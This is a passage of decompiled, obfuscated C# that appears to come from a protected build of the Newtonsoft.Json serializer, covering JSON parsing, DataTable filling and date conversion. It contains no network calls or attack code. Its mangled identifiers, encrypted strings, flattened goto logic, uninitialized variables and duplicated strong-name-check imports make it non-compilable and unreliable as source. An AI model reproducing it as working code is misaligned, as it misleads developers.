              goto label_19;
            }
          }
        }
label_8:
        \u0014.\u0006.\u0001(obj0);
label_9:
        if (obj0.\u0001() != JsonToken.EndArray)
        {
          \u0014.\u0006.\u0001(obj0, dataTable, obj2);
          goto label_8;
        }
        else
          \u008D.\u007E\u0090\u0003((object) dataRow, columnName, (object) dataTable);
label_19:
        \u0014.\u0006.\u0001(obj0);
      }
      global::\u0011.\u007E\u0013\u0002((object) dataRow);
      \u0002\u0003.\u007E\u0087\u0006((object) \u0001\u0003.\u007E\u0086\u0006((object) obj1), dataRow);
    }

    static \u0006.\u0005 \u0001() => new \u0006.\u0005((object) null, JTokenType.Undefined);

    static void \u0001([In] \u0008.\u0010 obj0, [In] \u0004.\u0011 obj1)
    {
label_0:
      if (false)
        goto label_4;
      else
        goto label_5;
label_1:
      if (true)
        goto label_8;
label_2:
      if (true)
      {
        obj0.\u0002.\u0001((\u0015.\u0013) obj1);
        goto label_8;
      }
      else
        goto label_0;
label_4:
      if (true)
        return;
      goto label_1;
label_5:
      if (obj0.\u0002 == null)
      {
        obj0.\u0001 = obj1;
        goto label_1;
      }
      else
        goto label_2;
label_8:
      obj0.\u0002 = obj1;
      obj0.\u0001 = (\u0015.\u0013) obj1;
      goto label_4;
    }

    static object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0015.\u0013 obj1,
      [In] System.Type obj2,
      [In] \u0005.\u0007 obj3,
      [In] JsonProperty obj4)
    {
      \u0016.\u0007 obj5 = \u0014.\u0006.\u0001(obj0, obj2);
      \u0005.\u0005 obj6 = \u0014.\u0006.\u0001(obj0, obj5, (\u0005.\u0005) null, (\u0006.\u0002) obj3, obj4);
      \u0012.\u0007 obj7 = \u0014.\u0006.\u0001(obj1);
      \u0014.\u0006.\u0001(obj7);
      return obj6 == null || !obj6.\u0002() ? \u0014.\u0006.\u0001(obj0, obj7, obj2, obj5, (JsonProperty) null, (\u0006.\u0002) obj3, obj4, (object) null) : \u0014.\u0006.\u0001(obj0, obj6, obj7, obj2, (object) null);
    }

    static void \u0001([In] JsonContainerType obj0, [In] JsonWriter obj1) => obj1.\u0001(obj0);

    static unsafe string \u0001([In] \u0015.\u0013 obj0)
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        if (obj0.\u0001() == null)
        {
          if (true)
            return string.Empty;
          goto label_11;
        }
        else
          goto label_21;
      }
label_5:
      int num2 = num1 + 1;
      IList<\u0015.\u0013> list;
      int count = list.Count;
      \u0015.\u0013 obj1;
      if (true)
      {
        if (num2 < count)
          obj1 = list[*(int*) voidPtr + 1];
        else if (list[*(int*) voidPtr].\u0001() == JTokenType.Property)
        {
          if (true)
            obj1 = list[*(int*) voidPtr];
          else
            goto label_21;
        }
      }
      else
        goto label_19;
label_11:
      List<\u0011.\u0002> objList1;
      \u0015.\u0013 obj2;
      if (obj1 != null)
      {
        \u0011.\u0002 obj3;
        if (true)
        {
          switch (obj2.\u0001())
          {
            case JTokenType.Array:
            case JTokenType.Constructor:
              break;
            case JTokenType.Property:
              if (true)
              {
                \u0002.\u0004 obj4 = (\u0002.\u0004) obj2;
                List<\u0011.\u0002> objList2 = objList1;
                obj3 = new \u0011.\u0002(JsonContainerType.Object);
                obj3.\u0001 = obj4.\u0001();
                \u0011.\u0002 obj5 = obj3;
                objList2.Add(obj5);
                goto label_17;
              }
              else
                goto label_21;
            default:
              goto label_17;
          }
        }
        *(int*) ((IntPtr) voidPtr + 4) = ((IList<\u0015.\u0013>) obj2).IndexOf(obj1);
        List<\u0011.\u0002> objList3 = objList1;
        obj3 = new \u0011.\u0002(JsonContainerType.Array);
        obj3.\u0001 = *(int*) ((IntPtr) voidPtr + 4);
        \u0011.\u0002 obj6 = obj3;
        objList3.Add(obj6);
      }
label_17:
      *(int*) voidPtr = *(int*) voidPtr + 1;
label_18:
      int num3 = *(int*) voidPtr;
      count = list.Count;
      num2 = num3;
label_19:
      if (num2 >= count)
        return \u0011.\u0002.\u0001(objList1, new \u0011.\u0002?());
      obj2 = list[*(int*) voidPtr];
      obj1 = (\u0015.\u0013) null;
      num1 = *(int*) voidPtr;
      goto label_5;
label_21:
      list = (IList<\u0015.\u0013>) \u0014.\u0006.\u0001(obj0).Reverse<\u0015.\u0013>().ToList<\u0015.\u0013>();
      objList1 = new List<\u0011.\u0002>();
      *(int*) voidPtr = 0;
      goto label_18;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static \u0012.\u0007 \u0001([In] \u0015.\u0013 obj0) => (\u0012.\u0007) new \u000E.\u000E(obj0, \u0014.\u0006.\u0001(obj0));

    static void \u0001(
      [In] MemberInfo obj0,
      [In] bool obj1,
      [In] DefaultContractResolver obj2,
      [In] JsonProperty obj3)
    {
      if (false)
        goto label_4;
      else
        goto label_12;
label_1:
      MemberInfo memberInfo = (MemberInfo) \u0003\u0003.\u007E\u0088\u0006((object) \u0001\u0002.\u007E\u0018\u0004((object) obj0), global::\u0006.\u009B(global::\u0001.\u007E\u000E((object) obj0), \u0014.\u0006.\u0082(6231)));
label_4:
      if ((object) memberInfo == null)
        memberInfo = (MemberInfo) \u0004\u0003.\u007E\u0089\u0006((object) \u0001\u0002.\u007E\u0018\u0004((object) obj0), global::\u0006.\u009B(global::\u0001.\u007E\u000E((object) obj0), \u0014.\u0006.\u0082(6231)));
      // ISSUE: variable of a compiler-generated type
      DefaultContractResolver.\u0006 obj;
      // ISSUE: type reference
      if ((object) memberInfo == null || (object) \u0014.\u0006.\u0001(memberInfo) != (object) \u0004\u0002.\u0084\u0004(__typeref (bool)))
      {
        if (true)
          return;
        goto label_1;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        obj.\u0001 = \u0014.\u0006.\u0001().\u0001<object>(memberInfo);
        if (false)
          return;
        // ISSUE: reference to a compiler-generated method
        obj3.\u0002(new Predicate<object>(obj.\u0001));
        if (!\u0014.\u0006.\u0001(memberInfo, obj1, false))
          return;
        obj3.\u0001(\u0014.\u0006.\u0001().\u0001<object>(memberInfo));
        return;
      }
label_12:
      // ISSUE: object of a compiler-generated type is created
      obj = new DefaultContractResolver.\u0006();
      goto label_1;
    }

    static unsafe object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] IList obj1,
      [In] \u0012.\u0007 obj2,
      [In] \u0001.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] string obj5)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      *(int*) voidPtr = \u001F.\u007E\u0016\u0003((object) ((\u0016.\u0007) obj3).\u0002());
      switch (obj5)
      {
        case null:
          \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, (object) obj1);
          \u0016.\u0007 obj6 = \u0014.\u0006.\u0001(obj0, obj3.\u0001());
          \u0005.\u0005 obj7 = \u0014.\u0006.\u0001(obj0, obj6, (\u0005.\u0005) null, (\u0006.\u0002) obj3, obj4);
          int? nullable1 = new int?();
          Stack<IList> listStack = new Stack<IList>();
          listStack.Push(obj1);
          IList list1 = obj1;
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
          do
          {
            *(int*) ((IntPtr) voidPtr + 4) = obj2.\u0001();
            if (listStack.Count == *(int*) voidPtr)
            {
              try
              {
                if (\u0014.\u0006.\u0001(obj0, obj2, obj6, obj7 != null))
                {
                  if (obj2.\u0001() == JsonToken.EndArray)
                  {
                    listStack.Pop();
                    list1 = listStack.Peek();
                    nullable1 = new int?();
                  }
                  else
                  {
                    object obj8 = obj7 == null || !obj7.\u0002() ? \u0014.\u0006.\u0001(obj0, obj2, obj3.\u0001(), obj6, (JsonProperty) null, (\u0006.\u0002) obj3, obj4, (object) null) : \u0014.\u0006.\u0001(obj0, obj7, obj2, obj3.\u0001(), (object) null);
                    int num = \u001E\u0002.\u007E\u008D\u0005((object) list1, obj8);
                  }
                }
                else
                  break;
              }
              catch (Exception ex)
              {
                \u0011.\u0002 obj9 = \u0014.\u0006.\u0001(obj2, *(int*) ((IntPtr) voidPtr + 4));
                object obj10 = (object) obj9.\u0001;
                if (\u0014.\u0006.\u0001(obj2.\u0001(), (object) obj1, obj10, ex, obj2 as \u000F.\u0001, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
                {
                  \u0014.\u0006.\u0001(obj2, obj0, *(int*) ((IntPtr) voidPtr + 4), true);
                  if (nullable1.HasValue)
                  {
                    int? nullable2 = nullable1;
                    *(int*) ((IntPtr) voidPtr + 8) = obj9.\u0001;
                    if ((nullable2.GetValueOrDefault() == *(int*) ((IntPtr) voidPtr + 8) ? (nullable2.HasValue ? 1 : 0) : 0) != 0)
                      throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(6244), ex, obj2);
                  }
                  nullable1 = new int?(obj9.\u0001);
                }
                else
                  throw;
              }
            }
            else if (obj2.\u0001())
            {
              switch (obj2.\u0001())
              {
                case JsonToken.StartArray:
                  IList list2 = (IList) new List<object>();
                  int num1 = \u001E\u0002.\u007E\u008D\u0005((object) list1, (object) list2);
                  listStack.Push(list2);
                  list1 = list2;
                  break;
                case JsonToken.Comment:
                  break;
                case JsonToken.EndArray:
                  listStack.Pop();
                  if (listStack.Count > 0)
                  {
                    list1 = listStack.Peek();
                    break;
                  }
                  *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                  break;
                default:
                  throw \u0014.\u0006.\u0001(obj2, \u0086.\u0086\u0003((object) \u0014.\u0006.\u0082(6305), (object) obj2.\u0001()));
              }
            }
            else
              break;
          }
          while (*(sbyte*) ((IntPtr) voidPtr + 12) == (sbyte) 0);
          if (*(sbyte*) ((IntPtr) voidPtr + 12) == (sbyte) 0)
            \u0014.\u0006.\u0001((object) obj1, obj0, (\u0016.\u0007) obj3, \u0014.\u0006.\u0082(6386), obj2);
          \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, (object) obj1);
          return (object) obj1;
        default:
          \u0014.\u0006.\u0001(obj2, obj0, (object) obj1, obj5);
          goto case null;
      }
    }

    static CultureInfo \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001 ?? \u0098.\u0002\u0004();

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0011.\u0008 obj1,
      [In] JsonProperty obj2,
      [In] \u0012.\u0007 obj3,
      [In] string obj4,
      [In] object obj5)
    {
      if (obj1.\u0001() != null)
      {
        try
        {
          object obj = \u0014.\u0006.\u0001(obj3, obj1, obj2, obj0);
          obj1.\u0001()(obj5, obj4, obj);
        }
        catch (Exception ex)
        {
          throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6443), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0002()), ex, obj3);
        }
      }
      else
        \u0014.\u0006.\u0001(obj3);
    }

    static void \u0001()
    {
      try
      {
        \u0014.\u0006.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static void \u0001([In] \u0016.\u0007 obj0, [In] object obj1, [In] StreamingContext obj2)
    {
label_0:
      if (obj0.\u0002 == null)
        goto label_11;
label_1:
      if (true)
      {
        if (true)
        {
          IEnumerator<\u0008.\u000E> enumerator = obj0.\u0002.GetEnumerator();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              if (true)
                enumerator.Current(obj1, obj2);
              else
                break;
            }
          }
          finally
          {
            if (enumerator != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator);
          }
        }
      }
      else
        goto label_0;
label_11:
      if (true)
      {
        if (false)
          goto label_1;
      }
      else
        goto label_0;
    }

    static long \u0001([In] DateTime obj0, [In] TimeSpan obj1)
    {
      int num1;
      if (true)
      {
        if (obj0.Kind != DateTimeKind.Utc)
          num1 = \u0005\u0003.\u008A\u0006(obj0, DateTime.MaxValue) ? 1 : 0;
        else
          goto label_6;
      }
      else
        goto label_8;
label_3:
      long num2;
      int num3;
      for (; num1 == 0; num1 = num3)
      {
        num3 = \u0005\u0003.\u008A\u0006(obj0, DateTime.MinValue) ? 1 : 0;
        if (false)
          continue;
        if (num3 == 0)
        {
          num2 = obj0.Ticks - obj1.Ticks;
          goto label_8;
        }
        else
          break;
      }
label_6:
      return obj0.Ticks;
label_8:
      long num4 = num2;
      if (true)
      {
        if (num4 > 3155378975999999999L)
          return 3155378975999999999;
        num4 = num2;
      }
      if (num4 >= 0L)
        return num2;
      num1 = 0;
      if (num1 == 0)
      {
        long num5 = (long) num1;
        return false ? num5 : num5;
      }
      goto label_3;
    }

    static void \u0001([In] \u0015.\u0002 obj0, [In] \u0012.\u0007 obj1)
    {
      if (obj0 >= \u0015.\u0002.\u0001)
      {
        while (obj0 <= \u0015.\u0002.\u0002)
        {
          do
          {
            obj1.\u0001 = obj0;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static bool \u0001(ref DateTime _param0, \u0004.\u0001 _param1, [Out] \u0015.\u0008 _param2)
    {
      \u0010.\u0002 obj1 = new \u0010.\u0002();
      if (!obj1.\u0001(_param2.\u0001(), _param2.\u0001(), _param2.\u0002()))
      {
        _param0 = new DateTime();
        return false;
      }
      DateTime dateTime1 = \u0014.\u0006.\u0001(obj1);
      \u0012.\u0008 obj2 = obj1.\u0001;
      long ticks1;
      DateTime dateTime2;
      do
      {
        switch (obj2)
        {
          case \u0012.\u0008.\u0002:
            dateTime1 = new DateTime(dateTime1.Ticks, DateTimeKind.Utc);
            goto label_23;
          case \u0012.\u0008.\u0003:
            TimeSpan timeSpan1 = new TimeSpan(obj1.\u0008, obj1.\u000E, 0);
            ticks1 = dateTime1.Ticks + timeSpan1.Ticks;
            long num1 = ticks1;
            dateTime2 = DateTime.MaxValue;
            long ticks2 = dateTime2.Ticks;
            if (num1 <= ticks2)
            {
              dateTime2 = new DateTime(ticks1, DateTimeKind.Utc);
              dateTime1 = dateTime2.ToLocalTime();
              continue;
            }
            goto label_7;
          case \u0012.\u0008.\u0004:
            goto label_11;
          default:
            goto label_23;
        }
      }
      while (false);
      if (false)
        goto label_10;
      else
        goto label_23;
label_7:
      long num2 = ticks1;
      if (true)
      {
        long ticks3 = \u0004.\u0007.\u0001(dateTime1).Ticks;
        ticks1 = num2 + ticks3;
        long num3 = ticks1;
        dateTime2 = DateTime.MaxValue;
        long ticks4 = dateTime2.Ticks;
        if (num3 > ticks4)
        {
          dateTime2 = DateTime.MaxValue;
          ticks1 = dateTime2.Ticks;
        }
      }
      else
        goto label_15;
label_10:
      dateTime1 = new DateTime(ticks1, DateTimeKind.Local);
      goto label_23;
label_11:
      TimeSpan timeSpan2 = new TimeSpan(obj1.\u0008, obj1.\u000E, 0);
      ticks1 = dateTime1.Ticks - timeSpan2.Ticks;
      long num4 = ticks1;
      dateTime2 = DateTime.MinValue;
      TimeSpan timeSpan3;
      if (true)
      {
        long ticks5 = dateTime2.Ticks;
        if (num4 >= ticks5)
        {
          dateTime2 = new DateTime(ticks1, DateTimeKind.Utc);
          dateTime1 = dateTime2.ToLocalTime();
          goto label_23;
        }
        else
        {
          long num5 = ticks1;
          timeSpan3 = \u0004.\u0007.\u0001(dateTime1);
          num2 = num5;
        }
      }
      else
        num2 = num4;
label_15:
      long ticks6 = timeSpan3.Ticks;
      if (true)
      {
        long num6 = num2 + ticks6;
        long num7;
        while (true)
        {
          ticks1 = num6;
          num7 = ticks1;
          dateTime2 = DateTime.MinValue;
          if (false)
            num6 = num7;
          else
            break;
        }
        ticks6 = dateTime2.Ticks;
        num2 = num7;
      }
      if (num2 < ticks6)
      {
        dateTime2 = DateTime.MinValue;
        if (true)
          ticks1 = dateTime2.Ticks;
        else
          goto label_23;
      }
      dateTime1 = new DateTime(ticks1, DateTimeKind.Local);
label_23:
      _param0 = \u0014.\u0006.\u0001(dateTime1, _param1);
      return true;
    }

    static IEnumerable<\u0015.\u0013> \u0001([In] \u0015.\u0013 obj0, [In] bool obj1) => (IEnumerable<\u0015.\u0013>) new \u0015.\u0013.\u0002(-2)
    {
      \u0002 = obj0,
      \u0002 = obj1
    };

    static bool \u0001([In] bool[] obj0, [In] string obj1)
    {
      if (true)
        goto label_11;
label_1:
      return false;
label_11:
      switch (obj1)
      {
        case null:
          goto label_1;
        default:
          string str = obj1;
          int num1 = 0;
          if (num1 != 0)
            goto label_14;
          else
            goto label_13;
label_8:
          int num2;
          int num3 = num2;
          int num4 = \u001F.\u007E\u0011\u0003((object) str);
          int num5 = num3;
label_9:
          if (num5 >= num4)
            return false;
          num1 = (int) \u001B\u0002.\u007E\u0088\u0005((object) str, num2);
          goto label_14;
label_13:
          num2 = num1;
          goto label_8;
label_14:
          char index = (char) num1;
          num5 = (int) index;
          num4 = obj0.Length;
          if (true)
          {
            if (num5 < num4)
            {
              if (true)
              {
                if (!obj0[(int) index])
                {
                  ++num2;
                  goto label_8;
                }
              }
              else
                goto label_8;
            }
            return true;
          }
          goto label_9;
      }
    }

    static DataContractAttribute \u0001([In] System.Type obj0)
    {
      if (true)
        goto label_6;
label_1:
      DataContractAttribute contractAttribute;
      if (true)
        return contractAttribute;
label_5:
      return (DataContractAttribute) null;
label_6:
      System.Type type1 = obj0;
      if (true)
        goto label_7;
label_3:
      System.Type type2;
      while (true)
      {
        do
        {
          if (true)
            goto label_4;
label_2:
          continue;
label_4:
          if ((object) type2 != null)
          {
            contractAttribute = \u0003.\u0007<DataContractAttribute>.\u0001((object) type2);
            if (contractAttribute == null)
              goto label_2;
            else
              goto label_1;
          }
          else
            goto label_5;
        }
        while (false);
        type2 = \u0015.\u000E.\u0001(type2);
      }
label_7:
      type2 = type1;
      goto label_3;
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonWriter obj1) => \u0014.\u0006.\u0001(obj0, obj1, true);

    static void \u0001([In] \u0012.\u0007 obj0)
    {
label_0:
      if (!obj0.\u0001.\u0001)
        goto label_3;
label_1:
      if (true)
        ++obj0.\u0001.\u0001;
      else
        goto label_0;
label_3:
      if (false)
        goto label_1;
    }

    static bool \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] object obj2,
      [In] JsonProperty obj3,
      [In] \u0016.\u0007 obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      if (obj2 != null && obj4.\u0001 != \u0003.\u0005.\u0004 && obj4.\u0001 != \u0003.\u0005.\u0005)
        goto label_2;
label_1:
      return true;
label_2:
      \u0011.\u0006? nullable = new \u0011.\u0006?();
      if (obj3 != null)
        goto label_25;
label_3:
      if (!nullable.HasValue && obj6 != null)
        nullable = obj6.\u0002();
      string str1;
      int num;
      do
      {
        num = nullable.HasValue ? 1 : 0;
        if (true)
        {
          if (num == 0 && obj5 != null)
            nullable = obj5.\u0001();
          if ((((\u0016.\u0008) obj0).\u0001.\u0001 != null ? (\u000E.\u0008.\u0001((IEnumerable) obj0.\u0001, obj2, ((\u0016.\u0008) obj0).\u0001.\u0001) ? 1 : 0) : (obj0.\u0001.Contains(obj2) ? 1 : 0)) != 0)
          {
            string str2 = \u0014.\u0006.\u0082(6516);
            if (obj3 != null)
              str2 = global::\u0006.\u009B(str2, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6557), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3.\u0001));
            str1 = global::\u0006.\u009B(str2, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6586), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj2)));
            switch (nullable.GetValueOrDefault(((\u0016.\u0008) obj0).\u0001.\u0001))
            {
              case \u0011.\u0006.\u0001:
                if (true)
                  throw \u0014.\u0006.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), str1, (Exception) null);
                goto label_1;
              case \u0011.\u0006.\u0002:
                if (((\u0016.\u0008) obj0).\u0001 != null)
                  continue;
                goto label_19;
              case \u0011.\u0006.\u0003:
                goto label_20;
              default:
                goto label_24;
            }
          }
          else
            goto label_24;
        }
        else
          goto label_12;
      }
      while (false);
      goto label_17;
label_12:
      return num != 0;
label_17:
      if (((\u0016.\u0008) obj0).\u0001.\u0001() >= TraceLevel.Verbose)
        ((\u0016.\u0008) obj0).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(6611))), (Exception) null);
label_19:
      return false;
label_20:
      while (((\u0016.\u0008) obj0).\u0001 != null && ((\u0016.\u0008) obj0).\u0001.\u0001() >= TraceLevel.Verbose)
      {
        if (true)
        {
          ((\u0016.\u0008) obj0).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(6672))), (Exception) null);
          break;
        }
      }
      return true;
label_24:
      return true;
label_25:
      nullable = obj3.\u0001();
      goto label_3;
    }

    static bool \u0001([In] \u0012.\u0007 obj0)
    {
      JsonToken jsonToken = obj0.\u0001();
      int num;
      while (true)
      {
        while (jsonToken != JsonToken.None)
        {
          if (true)
          {
            if (jsonToken != JsonToken.Comment)
              return true;
            break;
          }
        }
        num = obj0.\u0001() ? 1 : 0;
        if (true)
        {
          if (true)
          {
            if (num != 0)
              jsonToken = obj0.\u0001();
            else
              goto label_3;
          }
          else
            goto label_4;
        }
        else
          break;
      }
      return num != 0;
label_4:
      return num != 0;
label_3:
      return false;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe JsonReaderException \u0001(
      [In] string obj0,
      [In] string obj1,
      [In] Exception obj2,
      [In] \u000F.\u0001 obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(8);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num;
      obj1 = \u0011.\u0002.\u0001(obj3, obj0, obj1);
      if (obj3 == null || !obj3.\u0002())
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
      }
      else
        goto label_5;
label_2:
      return new JsonReaderException(obj1, obj2, obj0, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4));
label_5:
      *(int*) voidPtr = obj3.\u0002();
      *(int*) ((IntPtr) voidPtr + 4) = obj3.\u0003();
      goto label_2;
    }

    static bool \u0001([In] string obj0, [In] \u0015.\u0012 obj1)
    {
      switch (obj0)
      {
        case null:
          throw new ArgumentNullException(\u0014.\u0006.\u0082(6721));
        default:
          if (obj1.\u0001 == null)
            return false;
          int num = obj1.\u0001.ContainsKey(obj0) ? 1 : 0;
          return false ? num != 0 : num != 0;
      }
    }

    static byte[] \u0001([In] \u000E.\u000F obj0, [In] object obj1)
    {
      while (!\u0015.\u000E.\u0001(\u0001\u0002.\u007E\u0017\u0004(obj1), \u0014.\u0006.\u0082(6726)))
      {
        if (!(obj1 is SqlBinary sqlBinary))
          throw new JsonSerializationException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6772), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0001\u0002.\u007E\u0017\u0004(obj1)));
        if (true)
          return sqlBinary.Value;
      }
      \u0014.\u0006.\u0001(obj0, \u0001\u0002.\u007E\u0017\u0004(obj1));
      return (byte[]) \u0014.\u0006.\u0001(obj0.\u0001, obj1, \u0014.\u0006.\u0082(6759));
    }

    static string \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static DataMemberAttribute \u0001([In] MemberInfo obj0)
    {
      while (\u0015.\u000E.\u0001(obj0) != MemberTypes.Field)
      {
        PropertyInfo propertyInfo1 = (PropertyInfo) obj0;
        if (true)
        {
          DataMemberAttribute dataMemberAttribute = \u0003.\u0007<DataMemberAttribute>.\u0001((object) propertyInfo1);
          if (dataMemberAttribute == null && ReflectionUtils.\u0001(propertyInfo1))
          {
label_1:
            System.Type type = \u0001\u0002.\u007E\u0018\u0004((object) propertyInfo1);
label_6:
            do
            {
              if (false)
                goto label_1;
            }
            while (false);
            if (dataMemberAttribute == null)
            {
              while ((object) type != null)
              {
                if (true)
                {
                  PropertyInfo propertyInfo2 = (PropertyInfo) \u0014.\u0006.\u0001(type, (MemberInfo) propertyInfo1);
                  if ((object) propertyInfo2 != null && ReflectionUtils.\u0001(propertyInfo2))
                    dataMemberAttribute = \u0003.\u0007<DataMemberAttribute>.\u0001((object) propertyInfo2);
                  type = \u0015.\u000E.\u0001(type);
                  goto label_6;
                }
              }
            }
          }
          return dataMemberAttribute;
        }
      }
      return \u0003.\u0007<DataMemberAttribute>.\u0001((object) obj0);
    }

    static void \u0001([In] JsonWriter obj0, [In] \u0004.\u0002 obj1)
    {
      if (obj1 >= \u0004.\u0002.\u0001)
      {
        while (obj1 <= \u0004.\u0002.\u0002)
        {
          do
          {
            obj0.\u0001 = obj1;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static bool \u0001([In] System.Type obj0)
    {
      if (true)
        goto label_14;
label_2:
      TypeConverter typeConverter;
      if (true)
      {
        if (true)
        {
          // ISSUE: type reference
          if (typeConverter is ReferenceConverter || (object) \u0001\u0002.\u007E\u0017\u0004((object) typeConverter) == (object) \u0004\u0002.\u0084\u0004(__typeref (TypeConverter)))
            goto label_9;
        }
        else
          goto label_12;
      }
      int num1;
      // ISSUE: type reference
      for (int index = \u0093\u0002.\u007E\u0014\u0006((object) typeConverter, \u0004\u0002.\u0084\u0004(__typeref (string))) ? 1 : 0; index != 0; index = num1)
      {
        num1 = 1;
        if (num1 != 0)
          return num1 != 0;
      }
label_9:
      int num2;
      // ISSUE: type reference
      if ((object) obj0 != (object) \u0004\u0002.\u0084\u0004(__typeref (System.Type)))
      {
        // ISSUE: type reference
        num2 = \u0093\u0002.\u007E\u0013\u0006((object) obj0, \u0004\u0002.\u0084\u0004(__typeref (System.Type))) ? 1 : 0;
      }
      else
        goto label_12;
label_11:
      if (num2 == 0)
        return false;
label_12:
      num2 = 1;
      if (num2 != 0)
        return num2 != 0;
      goto label_11;
label_14:
      typeConverter = \u0014.\u0006.\u0001(obj0);
      if (typeConverter == null || typeConverter is ComponentConverter)
        goto label_9;
      else
        goto label_2;
    }

    static string \u0001() => \u0006\u0003.\u007E\u008C\u0006((object) \u0014.\u0006.\u0001(), \u0014.\u0006.\u0082(6837), \u0005.\u0001.\u0001);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe bool \u0001([In] \u0011.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      char ch1 = obj0.\u0001[obj0.\u0002];
      char ch2;
      do
      {
        if (ch1 != '"' && ch1 != '\'')
        {
          if (\u0014.\u0006.\u0001(obj0, ch1))
          {
            ch2 = char.MinValue;
            \u0014.\u0006.\u0001(obj0);
            \u0014.\u0006.\u0001(obj0);
          }
          else
            goto label_3;
        }
        else
          goto label_12;
label_4:
        string str;
        if (obj0.\u0001 != null)
        {
          \u0008.\u0005 obj = obj0.\u0001;
          char[] chArray = obj0.\u0001.\u0001();
          *(int*) voidPtr = obj0.\u0001.\u0001();
          *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0001.\u0002();
          str = \u0014.\u0006.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj, chArray, *(int*) voidPtr) ?? obj0.\u0001.ToString();
        }
        else
          str = obj0.\u0001.ToString();
        \u0014.\u0006.\u0001(obj0, false);
        if (obj0.\u0001[obj0.\u0002] == ':')
        {
          ++obj0.\u0002;
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.PropertyName, (object) str);
          continue;
        }
        goto label_8;
label_12:
        ++obj0.\u0002;
        ch2 = ch1;
        \u0014.\u0006.\u0001(obj0);
        \u0014.\u0006.\u0001(obj0, ch2);
        goto label_4;
      }
      while (false);
      goto label_10;
label_3:
